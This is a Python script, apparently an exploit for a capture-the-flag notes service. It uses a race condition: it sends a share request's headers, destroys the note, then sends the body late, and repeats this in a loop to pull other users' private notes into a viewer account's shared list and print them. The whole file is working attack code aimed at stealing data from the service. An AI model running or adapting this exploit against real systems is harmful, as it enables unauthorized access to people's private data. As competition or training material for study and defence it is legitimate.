#!/usr/bin/env python3

import sys
import json
import random
import string
import itertools
from typing import Self, List, Set, Coroutine

import asyncio
import aiohttp


IP = sys.argv[1] if len(sys.argv) > 1 else 'localhost'
PORT = 17171

TOKEN_HEADER_NAME = 'X-Token'

VIEWED_NOTES: Set[str] = set()


def random_string(length: int, alpha: str = string.ascii_lowercase + string.digits) -> str:
    symbols = random.choices(alpha, k = length)

    return ''.join(symbols)


class Client:
    def __init__(self: Self) -> None:
        self.url = f'http://{IP}:{PORT}'
        self.token = 'x'

    async def register(self: Self) -> str:
        username = random_string(16)
        password = random_string(32)

        async with aiohttp.ClientSession() as session:
            request = session.post(
                self.url + '/users/register',
                json = {
                    'name': username,
                    'password': password,
                },
                headers = {TOKEN_HEADER_NAME: self.token},
            )

            async with request as response:
                await response.text()
                self.token = response.headers.get(TOKEN_HEADER_NAME)

        return username
    
    async def note_get(self: Self, title: str) -> str:
        async with aiohttp.ClientSession() as session:
            request = session.get(
                self.url + f'/notes/{title}',
                headers = {TOKEN_HEADER_NAME: self.token},
            )

            async with request as response:
                return await response.text()

    async def note_create(self: Self) -> str:
        note_title = random_string(16)
        note_content = random_string(32)

        async with aiohttp.ClientSession() as session:
            request = session.post(
                self.url + '/notes',
                json = {
                    'title': note_title,
                    'content': note_content,
                    'visible': False,
                },
                headers = {TOKEN_HEADER_NAME: self.token},
            )

            async with request as response:
                await response.text()

        return note_title
    
    async def note_destroy(self: Self, title: str) -> None:
        async with aiohttp.ClientSession() as session:
            request = session.post(
                self.url + f'/notes/{title}/destroy',
                json = {},
                headers = {TOKEN_HEADER_NAME: self.token},
            )

            async with request as response:
                await response.text()

    async def user_profile(self: Self, name: str) -> str:
        async with aiohttp.ClientSession() as session:
            request = session.get(
                self.url + f'/users/profile/{name}',
                json = {},
                headers = {TOKEN_HEADER_NAME: self.token},
            )

            async with request as response:
                return await response.text()


async def note_steal_with_timeout(
        attacker: Client, note_title: str, viewer_name: str, timeout: int,
) -> bytes:
    obj = {
        'viewer': viewer_name,
    }
    data = json.dumps(obj).encode()

    reader, writer = await asyncio.open_connection(IP, PORT)

    writer.write(f'POST /notes/{note_title}/share HTTP/1.1\r\n'.encode())
    writer.write(f'Host: {IP}:{PORT}\r\n'.encode())
    writer.write(f'{TOKEN_HEADER_NAME}: {attacker.token}\r\n'.encode())
    writer.write(f'Content-Length: {len(data)}\r\n'.encode())
    writer.write(b'Content-Type: application/json\r\n')
    writer.write(b'\r\n')
    await writer.drain()

    # await asyncio.sleep(0.1)

    await attacker.note_destroy(note_title)

    await asyncio.sleep(timeout)

    writer.write(data)
    await writer.drain()

    response = await reader.read(65536)

    writer.close()

    return response


async def do_attack(
        wait: int, attacker: Client, viewer: Client, viewer_name: str, timeout: int,
) -> None:
    await asyncio.sleep(wait)

    note_title = await attacker.note_create()

    await note_steal_with_timeout(attacker, note_title, viewer_name, timeout)

    # await asyncio.sleep(0.1)

    raw = await viewer.user_profile(viewer_name)
    profile = json.loads(raw)

    for shared_note in profile['sharedNotes']:
        if shared_note in VIEWED_NOTES:
            continue

        VIEWED_NOTES.add(shared_note)

        note = await viewer.note_get(shared_note)
        print(note)


async def main() -> None:
    count = 5
    timeout = 10

    attacker = Client()
    attacker_name = await attacker.register()
    print(f'registered attacker with name: {attacker_name}')

    viewer = Client()
    viewer_name = await viewer.register()
    print(f'registered viewer with name: {viewer_name}')

    for i in itertools.count():
        print(f'started {i} round with {count} attacks')

        attacks: List[Coroutine] = []

        for i in range(count):
            attack = do_attack(i, attacker, viewer, viewer_name, timeout)
            attacks.append(attack)

        await asyncio.gather(*attacks)


if __name__ == '__main__':
    asyncio.run(main())
